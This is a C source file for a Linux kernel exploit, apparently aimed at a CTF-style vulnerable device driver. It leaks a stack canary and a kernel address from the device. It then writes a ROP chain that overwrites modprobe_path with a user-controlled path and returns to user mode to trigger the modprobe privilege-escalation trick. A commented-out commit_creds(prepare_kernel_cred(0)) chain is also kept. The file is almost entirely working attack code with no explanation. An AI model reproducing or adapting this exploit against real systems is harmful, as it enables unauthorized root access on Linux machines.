#include "libpwn.c"

int main(){
  save_state();
  fd = open(DEV_PATH, O_RDWR);
  if (fd < 0) error("[-] Failed fd open");
  char buffer[0x400];
  read(fd, buffer, 0x150);
  dump_hex(buffer, 0x150);
  leak = ((unsigned long *)buffer)[10];
  canary = ((unsigned long *)buffer)[19];
  kernel_base = leak - 0x1c8a08;
  // commit_creds = KADDR(0xffffffff81087e90);
  // prepare_kernel_cred = KADDR(0xffffffff810881d0);
  // xchg_rdi_rax = KADDR(0xffffffff82a05efb);
  // mov_rdi_rax = KADDR(0xffffffff813b3604);

  // info("commit_creds", commit_creds);
  // info("prepare_kernel_cred", prepare_kernel_cred);

  swapgs_restore_regs_and_return_to_usermode = KADDR(0xffffffff81c00a2f);

  pop_rdi_ret = KADDR(0xffffffff81001518);
  pop_rax_ret = KADDR(0xffffffff8100dc1e);
  write_rax_to_rdi = KADDR(0xffffffff8104ebe2);
  modprobe_path = KADDR(0xffffffff82444620);
  info("canary", canary);  
  info("leak", leak);
  info("kernel_base", kernel_base);
  info("swapgs_restore_regs_and_return_to_usermode", swapgs_restore_regs_and_return_to_usermode);
  info("pop_rdi_ret", pop_rdi_ret);
  info("pop_rax_ret", pop_rax_ret);
  info("write_rax_to_rdi", write_rax_to_rdi);
  info("modprobe_path", modprobe_path);

  uint64_t payload[0x200];
  int canary_idx = 4;
  payload[canary_idx++] = canary;
  payload[canary_idx++] = 0x0;


  payload[canary_idx++] = pop_rax_ret;
  payload[canary_idx++] = 0x73752f656d6f682f;
  payload[canary_idx++] = pop_rdi_ret;
  payload[canary_idx++] = modprobe_path;
  payload[canary_idx++] = write_rax_to_rdi;
  payload[canary_idx++] = pop_rax_ret;
  payload[canary_idx++] = 0x772f7265;
  payload[canary_idx++] = pop_rdi_ret;
  payload[canary_idx++] = modprobe_path + 0x8;
  payload[canary_idx++] = write_rax_to_rdi;
  payload[canary_idx++] = swapgs_restore_regs_and_return_to_usermode + 22;
  payload[canary_idx++] = 0;
  payload[canary_idx++] = 0;
  payload[canary_idx++] = (uint64_t)abuse_modprobe;
  payload[canary_idx++] = user_cs;
  payload[canary_idx++] = user_rflags;
  payload[canary_idx++] = user_sp;
  payload[canary_idx++] = user_ss;

  //Trying using commit_creds(prepare_kernel_cred(0)) but failed
// 0xffffffff82400000-0xffffffff82800000  0x0000000002400000-0x0000000002800000  0x400000     0x200000    2      [RW- KERN ACCESSED DIRTY]

  // payload[canary_idx++] = canary;
  // payload[canary_idx++] = 0x0;
  // payload[canary_idx++] = pop_rdi_ret;
  // payload[canary_idx++] = 0;
  // payload[canary_idx++] = prepare_kernel_cred;
  // payload[canary_idx++] = mov_rdi_rax;
  // payload[canary_idx++] = commit_creds;
  // payload[canary_idx++] = swapgs_restore_regs_and_return_to_usermode + 22;
  // payload[canary_idx++] = 0;
  // payload[canary_idx++] = 0;
  // payload[canary_idx++] = user_rip;
  // payload[canary_idx++] = user_cs;
  // payload[canary_idx++] = user_rflags;
  // payload[canary_idx++] = user_sp;
  // payload[canary_idx++] = user_ss;

  dump_hex((char *)payload, 0xc0);
  write(fd, (char *)payload, 0xc0);

  
}
